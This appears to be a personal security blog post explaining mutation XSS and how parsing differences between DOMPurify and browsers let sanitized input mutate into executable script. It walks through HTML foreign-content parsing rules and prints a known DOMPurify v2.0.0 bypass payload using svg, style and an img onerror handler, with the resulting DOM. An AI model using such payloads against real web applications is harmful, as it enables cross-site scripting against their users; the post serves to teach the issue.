---
title: "mXSS - The Parsing Magics"
summary: "Know about the parsing magics and mXSS"
date: "June 11 2025"
draft: false
tags:
  - Web
---


## What is mXSS?

- Due to parsing differences between sanitizers (e.g., DOMPurify) and browsers, input can be mutated (or transformed) when appended to the DOM tree using `innerHTML`.
    
- **In simple terms, abusing these parsing differences is called mXSS (mutation XSS).**
    

---

## How Does an HTML Sanitizer Work?

1. **Parsing:** The HTML content is parsed into a DOM tree, either on the server or in the browser.
    
2. **Sanitization:** The sanitizer iterates through the DOM tree and removes any dangerous or harmful content.
    
3. **Serialization:** After sanitizing, the DOM tree is serialized back into an HTML string.
    
4. **Re-parsing:** The serialized HTML is reassigned to `innerHTML`, triggering another parsing process.
    
5. **Appending to Document:** Finally, the sanitized DOM tree is appended to the document.
    

## DOMPurify – Behind The Scenes

> A client-side javaScript library used to sanitize HTML inputs and prevent XSS attacks.

![](/Pasted_image_20250608151138.png)

---

### Execution Flow

![DomPurify Execution Flow](/Pasted_image_20250608144723.png)

---

### DOMPurify Internals

1. **[`_initDocument`](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L855C9-L855C22)**  
    Uses [DOMParser API](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser) to parse unsafe input into a DOM structure.
    
2. **[`_createNodeIterator`](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L930)**  
    Uses [`NodeIterator`](https://developer.mozilla.org/en-US/docs/Web/API/NodeIterator) to traverse each DOM node in order.
    
3. **[`_sanitizeElements`](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L1003)**
    
    - Checks for DOM clobbering and known attack vectors like mXSS.
        
    - Removes or escapes disallowed tags (e.g., `<script>`, `<iframe>`, etc.).
        
4. **[`_sanitizeShadowDOM`](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L1384)**
    
    - DOMPurify normally skips `<template>` and [Shadow DOM](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment).
        
    - This function recursively dives into fragments and sanitizes those too.
        
5. **`_sanitizeAttributes`**
    
    - Goes through each attribute (`onclick`, `href`, `src`, etc.) and strips or modifies malicious ones.
        
6. **`body.innerHTML`**
    
    - After sanitization, the DOM is serialized back into clean HTML and reinserted into the page.
        



---

## Get Our Hand Dirty

Let’s understand what is mXSS with a small example:

```
element.innerHTML = '<u>some <i> HTML'
```

After inserting using `innerHTML`, when we retrieve the HTML, it looks different than the input.

```html
<u>
    Some 
    <i>HTML</i>
</u>
```

This happens because **HTML is designed to be fault-tolerant**.

---

### The svg Magic

```
element.innerHTML = '<svg><p>is this in svg?</svg>'
```

This gets parsed as:

```
<svg></svg>
<p>is this in svg?</p>
```

Here, `<p>` is moved out of `<svg>` since it’s not a valid child.

### More Examples

- `<svg>` tag can't have `<p>` as a child.
    
- `<form>` tag cannot contain a nested `<form>`.
    
- `<style>` treats everything inside as text, even if it's a tag.
    

[More such rules here].([https://sonarsource.github.io/mxss-cheatsheet/](https://sonarsource.github.io/mxss-cheatsheet/))

---

### The Escape

```
element.innerHTML = '<svg></p>is this is in svg?</svg>'
```

This gets parsed into:

```
<svg>
  <p></p>
  is this is in svg?
</svg>
```

Now **mXSS is possible!** DOMPurify gets bypassed because it assumes `<svg>` can’t contain malicious tags. But the browser parses it differently.

`<svg></p>` becomes a base for mXSS payloads inside `<svg>`.

Example:

```
<svg></p><style><a id="</style><img src=1 onerror=alert(1)"> 
```

DOM becomes:

```
<svg>
  <p></p>
  <style>
    <a id="</style><img src="1" onerror="alert(1)">
    ">
  </style>
</svg>
```

This XSS triggers even though it’s inside a `<style>` block. That’s because `**<svg>**`** changes the parsing rules to XML** (foreign content), which behaves differently.

---

### Abuse in DOMPurify v2.0.0

Payload:

```
<svg></p><style><a id="</style><img src=1 onerror=alert(1)"> 
```

- DOMPurify doesn’t sanitize the `onerror` attribute because it thinks everything inside `<style>` is just text.
    

![mXSS](/Pasted_image_20250610230300.png)

![mXSS](/Pasted_image_20250610230307.png)

- But when this is inserted into the DOM using `innerHTML`, the browser parses it differently:
    

```
<svg></svg>
<p>
  <style><a id="</style>
  <img src="1" onerror="alert(1)">
  ">
</p>
```

---

### Why Does `<svg>` Close Early?

	Even though we expected it to close at the end, the presence of `<style>` causes the parser to exit "foreign content mode."

- According to [§ 13.2.6.5: Parsing foreign content](https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inforeign), when the parser is inside a foreign element (like `<svg>`) and sees a tag that isn't allowed (like `<style>`), it **exits the foreign mode**.
    
- It pops `<svg>` off the stack and **reprocesses** the next tag (`<style>`) in **HTML mode**, continuing normally.
    

---

### Bonus:

[ChatGPT is my friend 😄 – See my chat with it](https://chatgpt.com/share/684942c3-3cd0-8011-8277-3eb28f7970fe)

---

### References:

- [https://github.com/msrkp/MXSS/blob/main/README.md](https://github.com/msrkp/MXSS/blob/main/README.md)
    
- [https://research.securitum.com/dompurify-bypass-using-mxss/](https://research.securitum.com/dompurify-bypass-using-mxss/)
    
- [https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
    
- [https://sonarsource.github.io/mxss-cheatsheet/](https://sonarsource.github.io/mxss-cheatsheet/)
    

---